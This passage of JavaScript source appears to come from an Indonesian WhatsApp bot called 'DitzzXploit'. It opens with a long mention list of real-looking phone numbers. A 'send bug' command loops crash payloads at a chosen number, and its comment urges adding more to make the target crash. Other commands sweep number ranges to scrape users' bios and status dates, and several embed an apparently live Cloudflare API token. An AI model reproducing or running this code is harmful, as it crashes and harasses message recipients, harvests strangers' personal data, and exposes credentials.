~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*
*_~`
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
  await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}
${kroco}
${bugss}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss} ${kroco}`}, {quoted: qbug})
await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss} ${kroco}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss} ${kroco}`}, {quoted: qbug})
}
//Tambahin sesuai sama lu, biar makin crash
reply(`Succes Send Bug Ke ${prrkek} deangan jumlah ${jumlah}`)
    
}
            break
 case 'sdomain': case 'sendomain': {
		 if (!isOwner) return reply(`Ngapain ? Khusus Rafathar Offcial Aja !!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,harga,domain`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
DitzzXploit.sendMessage(mq1, {text:`*───❖》Pedia Official《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Domain : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Tutup ( Sensor ) Domain Anda Dan Jangan Sampai Orang Lain Melihat Atau Tidak Nanti Domain Anda Bakal Kena Ddos Attack_*\n\n\n\n*© Rafathar Offcial*`}, m) 
                 }
            break
 case 'spanel': case 'sendpanel': {
		 if (!isOwner) return reply(`Ngapain ? Khusus Rafathar Offcial Aja !!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,harga,linklog`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
DitzzXploit.sendMessage(mq1, {text:`*───❖》Pedia Official《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : admin*\n*[+] Password : admin*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n\n\n\n*© Rafathar Offcial*`}, m) 
                 }
            break
        case 'nowa': {
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!args[0]) return m.reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return m.reply('Salah Tuan Bukan Begitu Xixi')
m.reply('Wait Tuan Sedang Kami Proses⏳')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await DitzzXploit.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await DitzzXploit.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
case 'wanumber': case 'neednokos': case 'nokoswa':{
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
if (!text) return reply(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await DitzzXploit.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await DitzzXploit.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break
   case 'leave': {
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
                await DitzzXploit.groupLeave(m.chat)
                await reply(`Done Tuan✅`)
            }
            break
case 'setbotname':{
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!text) return reply(`Dimana Namanya Tuan?\nExample: ${prefix + command} Rafathar Offcial`)
    await DitzzXploit.updateProfileName(text)
    reply(`Berhasil Mengubah Nama Bot Tuan✅`)
    }
    break
case 'setbotbio':{
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!text) return reply(`Dimana Textnya Tuan?\nExample: ${prefix + command} Rafathar Offcial`)
    await DitzzXploit.updateProfileStatus(text)
    reply(`Berhasil Mengubah Bio Nomor Bot Tuan✅`)
    }
    break
case "public": {
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
DitzzXploit.public = true
reply(`*SUKSES MODE PUBLIC TUAN✅*`)
}
break
case "self": {
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
DitzzXploit.public = false
reply(`*SUKSES MODE SELF TUAN✅*`)
}
break
case 'domain1': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80bb373d8fbd32d5e9eb5c173d7958cf";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain2': {
           
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "75743078ed2f835ede897fc2187122bd";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.net";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain3': {
           
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b2dab95fa93b9957f47ef84e1bc9558f";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain4': {
           
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "26b6ce099dc3d48e0b491a294786c68b";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
